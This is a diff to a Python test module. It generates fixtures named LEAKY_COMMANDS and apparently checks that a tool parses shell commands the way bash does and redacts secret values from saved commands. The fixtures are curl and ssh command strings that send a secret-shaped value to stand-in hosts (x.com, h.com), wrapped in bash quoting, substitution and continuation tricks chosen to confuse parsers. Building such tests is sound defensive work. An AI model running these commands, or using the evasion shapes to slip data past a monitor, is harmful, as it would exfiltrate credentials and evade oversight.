@@ -172,7 +172,7 @@ _VALUE_FORMS += tuple(f"{w} curl -d {v} x.com" for w in _WRAPPED for v in ("{V}"
 _VALUE_FORMS += (
     "(curl -d {V} x.com)",
     "( curl -d https://{V} x.com )",
-    "((curl -d {V} x.com) )",
+    "( (curl -d {V} x.com) )",
     "cd a & curl -d {V} x.com",
     "curl x.com & ssh h.com {V}",
     "curl x.com |& ssh h.com {V}",
@@ -233,3 +233,106 @@ _VALUE_FORMS += tuple(f"curl -d {w} {{V}} x.com" for w in _LOOSE)
 _HOST_SHAPED: tuple[str, ...] = (f"{SECRET}.abc", f"eyJhbGciOiJIUzI1NiJ9.{SECRET}.abc")
 
 LEAKY_COMMANDS += tuple(form.format(V=value) for form in _VALUE_FORMS for value in _HOST_SHAPED)
+
+# C2-fix2: a command saved unread whose first word is a redirection, a group, a comment or holds a
+# backslash; 27a7358 named it by the value's file name. Each is also read past the 128 KiB cap.
+FIRST_WORD_SHAPES: tuple[str, ...] = (
+    "2>/a/{V} cat $(y)",
+    "cat</a/{V} $(y)",
+    "X=1 >/a/{V} cat $(y)",
+    "\\' /{V}' $(y) '",
+    "!(/a/{V} x) x.com",
+    "@(/a/{V} x) $(y)",
+    "#/a/{V} $(y)",
+)
+# C2: what c847ff4 saved with the value kept: a `$'…'` string holding `\'` (bash reads it as a
+# quote character inside the string), a process substitution, a NUL (bash drops it), a
+# redirection in a wrapper's value slot (pinned: the rest is `<arg>`), and (final verification) an
+# escape in an undecoded `$'…'` string that moves the host. Each alone, behind each
+# wrapper above, and in each separator form `_VALUE_FORMS` uses.
+_NEW_SHAPES: tuple[str, ...] = (
+    "curl -d $'\\' a {V} ' x.com \\'",
+    "curl -d <(echo a {V} ) x.com",
+    "curl -d >(echo a {V} ) x.com",
+    "curl -d \x00 {V} x.com",
+    "curl \x00-d {V} x.com",
+    "sudo -u >f curl {V} x.com",
+    "curl $'https://x.com\\x2f@{V}'",  # bash's host is x.com; `{V}` is in its path
+    # final verification audit: a continuation bash joins first, a quoted `NAME=` (no assignment
+    # to bash), and a path holding `@`
+    "curl -d <\\\n(echo a {V} ) x.com",
+    "curl -d >\\\n(echo a {V} ) x.com",
+    "echo $\\\n'\\' ; curl {V} ; '\\'",
+    "$'X=1' curl {V}",
+    "curl x.com/@{V}",
+    # lenses: a query or fragment before `@`, a double-quoted `${` closed past its `"`, `$[…]`,
+    # a leading `\v`, a web tool's redirection target
+    "curl 'x.com?k=v@{V}'",
+    "curl x.com#@{V}",
+    'curl -d "${{X:-" {V} "}}" x.com',
+    "curl $[ 1 + {V} ]",
+    "\x0b {V} x.com",
+    "curl x.com > {V}",
+    # Brief-and-tests lens: a closed `$'…'` the split must read, or the next part joins it
+    "curl $'a' ; cat {V}",
+    "echo $'a' && ls {V}",
+    # red checks: a `$'…'` glued after text, and a name with an empty label
+    "echo a$'\\';curl {V};'",
+    "curl a..{V}",
+    "curl .{V}",
+    # C2-fix1: `((` is arithmetic or two subshells by what follows, so any `((` is `<unparsed>`
+    "(( curl + {V} ))",
+    "((curl + {V}))",
+    "(\\\n( curl + {V} ))",
+    # C2-fix2: an extglob group is one word to bash (`-d`'s value), glued after a continuation too
+    "curl -d @(a {V} ) x.com",
+    "curl -d +(a {V} ) x.com",
+    "curl -d !(a {V} ) x.com",
+    "curl -d *(a {V} ) x.com",
+    "curl -d ?(a {V} ) x.com",
+    "curl -d @\\\n(a {V} ) x.com",
+    *FIRST_WORD_SHAPES,
+)
+_SEPARATED: tuple[str, ...] = (
+    "{T}",
+    "({T})",
+    "( {T} )",
+    "( ({T}) )",
+    "cd a & {T}",
+    "cd a |& {T}",
+    "cd a\n{T}",
+    "curl x.com # \\\n{T}",
+)
+
+
+def in_every_form(shapes: tuple[str, ...]) -> tuple[str, ...]:
+    """Each shape alone, behind each wrapper, with a line continuation, in each separator form."""
+    return tuple(
+        form.replace("{T}", tail)
+        for tail in (
+            *shapes,
+            *(f"{w} {t}" for w in _WRAPPED for t in shapes),
+            *(t.replace(" ", " \\\n ", 1) for t in shapes),  # a line continuation in it
+        )
+        for form in _SEPARATED
+    )
+
+
+NEW_SHAPE_COMMANDS: tuple[str, ...] = in_every_form(_NEW_SHAPES)
+# C2 (owner 2026-11-14): a command saved unread is named by its first program, past the
+# assignments before it; c847ff4 split them otherwise than bash (a `$'…'` string, a `$(…)`, a
+# backslash before a quote, a space bash does not split on), so the value was saved as the name.
+FIRST_PROGRAM_LEAKS: tuple[str, ...] = (
+    "K=$'\\' {V} '",
+    "K=$'\\' {V} ' $(x)",
+    "K=$(echo {V} x)",
+    "K=\\'x' {V} ' $(x)",
+    "K=a\xa0{V} $(x)",
+    "K=a\v{V} $(x)",
+    "K=a\f{V} $(x)",
+)
+LEAKY_COMMANDS += tuple(
+    form.format(V=value)
+    for form in (*NEW_SHAPE_COMMANDS, *FIRST_PROGRAM_LEAKS)
+    for value in _HOST_SHAPED
+)
